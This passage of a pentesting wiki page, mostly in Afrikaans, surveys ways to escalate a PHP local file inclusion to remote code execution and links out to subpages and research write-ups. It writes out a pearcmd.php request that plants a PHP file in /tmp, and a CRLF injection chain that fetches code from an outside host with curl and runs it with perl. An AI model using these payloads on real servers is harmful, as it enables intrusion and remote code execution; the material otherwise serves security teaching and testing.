This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) verduidelik dat jy **php filters kan gebruik om ewekansige inhoud** as uitvoer te genereer. Dit beteken basies dat jy **ewekansige php code** vir die include kan genereer **sonder om dit in 'n lêer te skryf**.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Via segmentation fault

**Upload** 'n lêer wat as **tydelik** in `/tmp` gestoor sal word, dan in die **dieselfde versoek** 'n **segmentation fault** veroorsaak, en dan sal die **tydelike lêer nie verwyder word nie** en jy kan daarna soek.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Via Nginx temp file storage

Indien jy 'n **Local File Inclusion** gevind het en **Nginx** voor PHP loop, kan jy moontlik RCE verkry met die volgende tegniek:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Via PHP_SESSION_UPLOAD_PROGRESS

Indien jy 'n **Local File Inclusion** gevind het, selfs al **het jy nie 'n sessie nie** en `session.auto_start` is `Off`. As jy die **`PHP_SESSION_UPLOAD_PROGRESS`** in **multipart POST** data voorsien, sal PHP die **sessie vir jou aktiveer**. Dit kan jy misbruik om RCE te kry:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Via temp file uploads in Windows

Indien jy 'n **Local File Inclusion** gevind het en die bediener op **Windows** loop, kan jy moontlik RCE kry:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Via `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), bestaan die script `/usr/local/lib/phppearcmd.php` standaard in php docker images. Verder is dit moontlik om argumente aan die script via die URL deur te gee omdat dit aangedui word dat as 'n URL-param nie 'n `=` het nie, dit as 'n argument gebruik moet word. Sien ook [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) en [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

Die volgende versoek skep 'n lêer in `/tmp/hello.php` met die inhoud `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Die volgende misbruik 'n CRLF vuln om RCE te kry (van [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Via phpinfo() (file_uploads = on)

As jy 'n **Local File Inclusion** gevind het en 'n lêer wat **phpinfo()** openbaar met file_uploads = on, kan jy RCE kry:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

As jy 'n **Local File Inclusion** gevind het en jy **can exfiltrate the path** of the temp file, MAAR die **server** is **checking** of die **file to be included has PHP marks**, kan jy probeer om daardie **bypass that check** met hierdie **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Via eternal waiting + bruteforce

As jy die LFI kan misbruik om **upload temporary files** en die server te laat **hang** die PHP-uitvoering, kan jy daarna **brute force filenames during hours** om die temporary file te vind:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### To Fatal Error

As jy enige van die lêers `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` insluit. (Jy moet dieselfde een twee keer insluit om daardie fout te veroorsaak).

**Ek weet nie hoe dit nuttig is nie, maar dit kan wees.**\
_Even if you cause a PHP Fatal Error, PHP temporary files uploaded are deleted._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>

## Verwysings

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
